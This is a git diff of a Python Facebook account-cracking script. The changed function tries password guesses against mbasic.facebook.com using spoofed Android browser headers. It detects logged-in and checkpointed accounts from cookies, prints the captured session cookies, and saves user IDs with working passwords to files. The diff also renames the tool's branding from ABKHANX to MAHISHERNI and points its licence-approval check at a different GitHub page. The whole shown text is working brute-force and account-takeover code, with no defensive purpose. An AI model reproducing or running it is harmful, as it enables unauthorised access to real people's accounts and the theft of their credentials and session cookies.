@@ -1473,11 +1473,26 @@ def fcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'm.facebook.com',
-
-			'upgrade-insecure-requests': '1',
-
-			'viewport-width': '980',
+            header_freefb = {'authority': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=7xZVZZw2vMQYc3I_cgQJJKvv; sb=7xZVZbluPD7ulZ2fwzaQyEfk; m_pixel_ratio=2; wd=360x684; fr=09FI3SkMjEsNDBCSU..BlVRbv.kK.AAA.0.0.BlVRdW.AWV8AHUsiAE',
+    'dpr': '2',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"Infinix X680"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"10.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',
 
 			'method': 'path',
 
@@ -1516,21 +1531,21 @@ def fcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[ABKHANX-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
-                open('ABKHANX-OK.txt', 'a').write(cid+' | '+ps+ '\n')
+                print('\033[1;32m[MAHISHERNI-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                open('MAHISHERNI-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:152]
-                # print('\033[1;33m[ABKHANX-CP] '+uid+' | '+ps+'\x1b[1;97m')
-                open('ABKHANX-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                # print('\033[1;33m[MAHISHERNI-CP] '+uid+' | '+ps+'\x1b[1;97m')
+                open('MAHISHERNI-CP.txt', 'a').write(uid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r[\033[1;97mABKHANX\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
+        sys.stdout.write(f'\r[\033[1;97mMAHISHERNI\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
@@ -1542,7 +1557,7 @@ def approval():
   id = "-".join(uuid)
 
   try:
-    httpCaht = requests.get('https://github.com/Kaptan302/Apr/blob/main/Apr.txt').text
+    httpCaht = requests.get('https://github.com/Tahirkijaan143/Maahi/commits/main').text
     if id in httpCaht:
       print("\33[1;32mYOUR KEY IS APPROVED.")
       msg = str(os.geteuid())
